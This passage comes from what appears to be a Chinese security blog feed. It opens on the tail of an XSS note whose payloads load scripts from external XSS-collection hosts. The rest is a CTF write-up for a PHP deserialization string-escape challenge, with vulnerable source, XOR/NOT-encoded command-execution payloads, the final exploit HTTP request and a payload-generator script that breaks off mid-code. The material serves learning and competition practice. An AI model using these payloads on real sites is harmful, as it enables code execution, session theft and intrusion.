PHP的标签;<br>addslashes(string)返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串;还有最后一道htmlspecialchars()函数，让你不得翻身。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&#x27;&quot;&gt;&lt;sCRiPt sRC=https://0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>特点：通过JavaScript操作document，实现dom数的重构</p><p>主要存在与用户能修页面的dom，造成客户端playload在浏览器中运行</p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916142202534-1700990490828-308.png"></p><p>关键代码</p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916142627972-1700990490828-309.png"></p><p>现在第一个框提交’; <sCRiPt src="//xss.pt/J5ddFe">//</p><p>根据源码';将框起来的语句闭合，后面呢//会注释，将与前面<sCrIpT>闭合</p><sCRiPt sRC=//xss.pt/J5ddFe>//又与前面闭合</sCrIpT></sCRiPt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023巅峰极客 Unserialize  Wp</title>
      <link href="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/"/>
      <url>/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023巅峰极客-unserialize-wp"><a href="#2023巅峰极客-unserialize-wp" class="headerlink" title="2023巅峰极客 unserialize  wp"></a>2023巅峰极客 unserialize  wp</h1><p>后台扫描发现<img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810173524265-1700990497600-315.png"></p><p>访问<a href="http://www.zip下载拿到源码my.php/">www.zip下载拿到源码my.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class pull_it &#123;</span><br><span class="line">    private $x;</span><br><span class="line"></span><br><span class="line">​    function __construct($xx) &#123;</span><br><span class="line">​       $this-&gt;x = $xx;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __destruct() &#123;</span><br><span class="line">​       if ($this-&gt;x) &#123;</span><br><span class="line">​          $preg_match = &#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;;</span><br><span class="line">​       if (eval($preg_match)) &#123;</span><br><span class="line">​          echo $preg_match;</span><br><span class="line">​          exit(&quot;save_waf&quot;);</span><br><span class="line">​       &#125;</span><br><span class="line">​       @eval($this-&gt;x);</span><br><span class="line">​       &#125;</span><br><span class="line">​    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">class push_it &#123;</span><br><span class="line">​    private $root;</span><br><span class="line">​    private $pwd;</span><br><span class="line"></span><br><span class="line">​    function __construct($root, $pwd) &#123;</span><br><span class="line">​       $this-&gt;root = $root;</span><br><span class="line">​       $this-&gt;pwd = $pwd;</span><br><span class="line">​    &#125;</span><br><span class="line">​    </span><br><span class="line">​       function __destruct() &#123;</span><br><span class="line">​       unset($this-&gt;root);</span><br><span class="line">​       unset($this-&gt;pwd);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __toString() &#123;</span><br><span class="line">​       if (isset($this-&gt;root) &amp;&amp; isset($this-&gt;pwd)) &#123;</span><br><span class="line">​          echo &quot;&lt;h1&gt;Hello, $this-&gt;root&lt;/h1&gt;&quot;;</span><br><span class="line">​       &#125;</span><br><span class="line">​       else &#123;</span><br><span class="line">​          echo &quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;;</span><br><span class="line">​       &#125;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>my.php里的pull_it是恶意类，能控制$this-&gt;x就能命令执行，这里是无字母数字命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php里对传入的参数先做序列化存储在$_SESSION里，并用b函数替换字符</p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810174134098-1700990497600-317.png"></p><p>当访问login.php时，会先替换字符再做反序列化</p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810174205139-1700990497600-316.png"></p><p>a函数和b函数都是字符串替换，数量不一致很明显存在字符串逃逸。一个是b字符串由短变长，第二个a函数是由长变短，我们这里利用a函数</p><p>自己的做法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>=<span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;    </span><br><span class="line"><span class="comment">//O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;%00push_it%00root&quot;;s:4:&quot;root&quot;;s:12:&quot;%00push_it%00pwd&quot;;s:3:&quot;qwe&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O:7:”push_it”:2:{s:13:”%00push_it%00root”;s:4:”root”;s:12:”%00push_it%00pwd”;s:3:”qwe”;}我们利用这个来逃逸</p><p>O:7:”push_it”:2:{s:13:”%00push_it%00root”;s:4:”root**”;s:12:”%00push_it%00pwd”;s:3:”*<em>qwe”;}可以利用的加粗字符数一数有28位，我们就一共要逃逸28个字符，a函数没执行一次会多2位，所以需要重复14次   14</em>6&#x3D;84个b</p></blockquote><p>然后我们要进行构造pwd，pull_it里过滤了超多，是无字符数字rce，这里用到取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>=<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:7:&quot;pull_it&quot;:1:&#123;s:10:&quot; pull_it x&quot;;s:20:&quot;(~������)(~����Й�);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>我们现在已经知道了pull_it序列化后字符串的形式了，接下来我们只需要闭合push_it序列化字符串前面的符号即可：</p><p>前面逃逸出来的这些字符已经变成username串中的一部分了，我们在pwd中也需要加入这些进行闭合（这里的%00我们不能直接这么写，需要编码后才为%00，所以我们可以先写成\000，这个是8进制的写法，然后编码之后就能转为%00，但是在php中需要使用双引号才能识别\000）<br>“;s:12:”%00push_it%00pwd”;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;\&quot;;s:12:\&quot;\000push_it\000pwd\&quot;;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>push_it%<span class="number">00</span>pwd%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%D5%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810191408215-1700990497600-318.png"></p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810191445372-1700990497600-319.png"></p><p>大佬的做法：</p><p>利用脚本构造异或的playload：（文章末尾附脚本）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%00&quot;^&quot;%60%60%7c%20%2f%60%2a&quot;);</span><br><span class="line"></span><br><span class="line">base64一下</span><br><span class="line">KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810175712493-1700990497600-320.png">生成反序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后逃逸字符，逃逸14个字符，可以在pwd参数位置在本地微调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: web-898394c697.challenge.xctf.org.cn</span><br><span class="line">Content-Length: 313</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=52q1rf64lljie7ivi6tbte4hnb</span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:5:&quot;datou&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure><p>再访问login.php拿flag，记得带上SESSION</p><p>脚本：先php生成文本，再py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span 